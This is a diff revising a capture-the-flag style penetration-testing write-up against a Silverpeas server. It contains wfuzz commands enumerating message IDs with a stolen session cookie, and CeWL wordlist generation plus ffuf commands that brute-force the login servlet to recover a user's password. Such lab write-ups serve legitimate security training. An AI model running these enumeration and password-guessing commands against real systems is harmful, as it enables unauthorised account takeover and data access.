@@ -192,7 +192,7 @@ Through the proof-of-concept detailed in the link above, I iterated through the 
 **Testing the results with wfuzz:**
 
 ```bash
-$ wfuzz -u "http://<target-url>:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=FUZZ" -H "Cookie: JSESSIONID=xxx; path=/silverpeas; HttpOnly; defaultDomain=0; path=/; ... svpLogin=scr1ptkiddy; path=/; ..."
+$ wfuzz -z range,1-100 -u "http://<target-url>:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=FUZZ" -H "Cookie: JSESSIONID=xxx; path=/silverpeas; HttpOnly; defaultDomain=0; path=/; ... svpLogin=scr1ptkiddy; path=/; ..." 
 ```
 
 The results from _**wfuzz**_ showed a bunch of results with the content length (under the _**Chars**_ header in the output) of **13201** and **13202**. Thus, I decided to filter the results to only show those response with more than **13202** characters. (using the `--filter` flag):
@@ -232,18 +232,42 @@ After setting the cookie values on the browser console the same way as before, I
 
 **Experimenting with CeWL**
 
-Generating a custom word list
+1\. Generating a custom word list
 
 ```bash
 $ cewl http://<target_machine_URL>:80 -w passwords.txt
 ```
 
-Using the generated passwords word list with _**ffuf,**_ for the _**scr1ptkiddy**_ user
+2\. Utilizing _**ffuf**_ to use the generated passwords word list to crack the password for the _**scr1ptkiddy**_ user.
 
-<pre class="language-bash"><code class="lang-bash"><strong>$ ffuf -u http://&#x3C;target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&#x26;Password=FUZZ&#x26;DomainId=0" -w &#x3C;wordlist> -fc 302
+A bulk of the responses from _**ffuf**_ appears to have the same status, size, words and lines (as shown from the output format). Thus,  I tried a few methods to possibly filter a positive response:
+
+_**Match status codes 200-209**_
+
+`-mc 200,209`
+
+```bash
+$ ffuf -mc 200,209 -w <wordlist> -u http://<target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&Password=FUZZ&DomainId=0"
+```
+
+This option does not work. It seems that a positive response also returns the same status code as the negative responses.
+
+
+
+_**Filter regular expression patterns present in response**_
+
+`-fr "ErrorCode"`
+
+_Other possible options_
+
+`-fr "Login"` - does not work since the word _Login_ is present in the positive response
+
+`-fr "Login\?"` - Matches the pattern _Login?_, which is only present in the negative responses
+
+<pre class="language-bash"><code class="lang-bash"><strong>$ ffuf -w &#x3C;wordlist> -fr "ErrorCode" -u http://&#x3C;target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&#x26;Password=FUZZ&#x26;DomainId=0"
 </strong></code></pre>
 
-
+This option works to return a positive match for the password: `adipiscing`. Using the found password with the username scr1ptkiddy allows us to login to the dashboard. The method to retrieve the SSH credentials (refer to the details above - **CVE 2023-47323**) can be applied as the newly authenticated user.
 
 {% embed url="https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/tools-services/wordlists/cewl" %}
 
